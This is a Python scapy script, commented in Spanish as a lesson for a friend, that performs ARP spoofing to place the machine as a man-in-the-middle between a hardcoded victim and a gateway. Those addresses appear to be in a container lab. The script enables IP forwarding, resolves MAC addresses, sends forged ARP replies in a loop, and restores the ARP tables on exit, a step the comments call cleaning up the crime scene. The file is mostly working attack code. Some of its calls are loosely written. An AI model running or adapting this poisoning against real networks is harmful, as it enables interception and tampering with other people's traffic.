#! /usr/bin/env python

#####################################################################
#########            EN ESTE SCRIPT VOY A INTENTAR          ######### 
#########   DE EXPLICAR TOD0 PARA MI AMIGO PABLITO CHEWIN   #########
#########     COMO LO QUIERO A MI AMIGO PABLITO CHEWIN      #########
#####################################################################

from scapy.all import *
import sys
import os
import time

## ENTRADA DE DATOS
try:
    victimIP = "172.17.0.3"
    gateIP = "172.17.0.2"
except KeyboardInterrupt:
    print ("\n[*] User Requested Shutdown")
    print ("[*] Exiting...")
    sys.exit(1)
    
print ("\n[*] Enabling IP Forwarding...\n")
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

## OBTENEMOS LA MAC DE LA VICTIMA CON UN ARP REQUEST
def get_mac(IP):
    conf.verb = 0
    ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), timeout = 2, iface = "eth0", inter = 0.1)
    for snd,rcv in ans:
        return rcv.sprintf(r"%Ether.src%")

## RE-ASIGNANDO LA DIRECCION DEL OBJETIVO (LIMPIANDO LA ESCENA DEL CRIMEN)
def reARP():
    
    print("\n[*] Restoring Targets...")
    victimMAC = get_mac("172.17.0.3")
    gateMAC = get_mac("172.17.0.2")
    sendp(ARP(op = 2, pdst = "172.17.0.2", psrc = "172.17.0.3", hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = victimMAC), count = 7)
    sendp(ARP(op = 2, pdst = "172.17.0.3", psrc = "172.17.0.2", hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gateMAC), count = 7)
    print("[*] Disabling IP Forwarding...")
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    print("[*] Shutting Down...")
    sys.exit(1)

## MANDANDO UN REQUEST ARP A AMBOS OBJETIVOS PARA DECIR QUE YO SOY EL OTRO OBJETIVO (ENGAÑANDO AL SISTEMA)
def trick(gm, vm):
    send(ARP(op = 2, pdst = "172.17.0.3", psrc = "172.17.0.2", hwdst= vm))
    sendp(ARP(op = 1, pdst = "172.17.0.2", psrc = "172.17.0.3", hwdst= gm))

## FUNCION MAIN
def mitm():
    try:
        victimMAC = get_mac("172.17.0.3")
    except Exception:
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")     
        print("[!] Couldn't Find Victim MAC Address")
        print("[!] Exiting...")
        sys.exit(1)
    try:
        gateMAC = get_mac("172.17.0.2")
    except Exception:
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")     
        print("[!] Couldn't Find Gateway MAC Address")
        print("[!] Exiting...")
        sys.exit(1)
    print("[*] Poisoning Targets...")
    while 1:
        try:
            trick(gateMAC, victimMAC)
            time.sleep(1.5)
        except KeyboardInterrupt:
            reARP()
            break
mitm()
